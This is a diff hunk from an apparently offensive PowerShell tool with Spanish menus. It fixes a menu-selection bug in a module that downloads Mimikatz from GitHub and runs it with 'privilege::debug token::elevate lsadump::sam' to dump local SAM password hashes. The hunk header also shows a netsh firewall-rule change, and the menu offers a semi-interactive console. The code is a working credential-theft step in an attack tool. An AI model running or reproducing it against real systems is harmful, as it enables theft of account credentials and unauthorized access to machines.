@@ -151,16 +151,16 @@ $Ps4="netsh advfirewall firewall set rule group='Instrumental de Administración
         'M' { 
         Clear-Host; Show-Banner ; Write-Host "[1] - Mimikatz" ; Write-Host "[2] - Consola semi-interactiva" ; Write-Host ""
         $module = Read-Host -Prompt 'Elige el módulo que quieres cargar' ; Write-Host ""
-        if($module -like '1') { Clear-Host; Show-Banner ; Write-Host "[1] - Recuperar hashes locales" ; Write-Host "" }
-        $module = Read-Host -Prompt 'Elige el módulo que quieres cargar' ; Write-Host ""
-        if($module -like '1') { Write-Host "Módulo cargado con éxito!" -ForegroundColor Green ; sleep -milliseconds 2000
+        if($module -like '1') { Clear-Host; Show-Banner ; Write-Host "[1] - Recuperar hashes locales" ; Write-Host ""
+        $module2 = Read-Host -Prompt 'Elige el módulo que quieres cargar' ; Write-Host ""
+        if($module2 -like '1') { Write-Host "Módulo cargado con éxito!" -ForegroundColor Green ; sleep -milliseconds 2000
 	$osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim()
         Write-Host "" ; Write-Host "Sistema de $system detectado, descargando Mimikatz.." -ForegroundColor Green 
 	EnableTLS ; Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180925/mimikatz_trunk.zip" -Outfile mimikatz.zip
 	Expand-Archive .\mimikatz.zip -Force
 	if($system -in '32 bits') { $mimipath = ".\mimikatz\Win32\" }
 	if($system -in '64 bits') { $mimipath = ".\mimikatz\x64\" }
-        Write-Host "" ; powershell $mimipath\mimikatz.exe privilege::debug token::elevate lsadump::sam exit ; Write-Host "" ; pause }
+        Write-Host "" ; powershell $mimipath\mimikatz.exe privilege::debug token::elevate lsadump::sam exit ; Write-Host "" ; pause }}
         if($module -like '2') { $console ="true" ; Write-Host "Módulo cargado con éxito!" -ForegroundColor Green }
 	if($module -in '1','2') { $null }
         else { Write-Host "Opción incorrecta, vuelve a intentarlo de nuevo" -ForegroundColor Magenta }
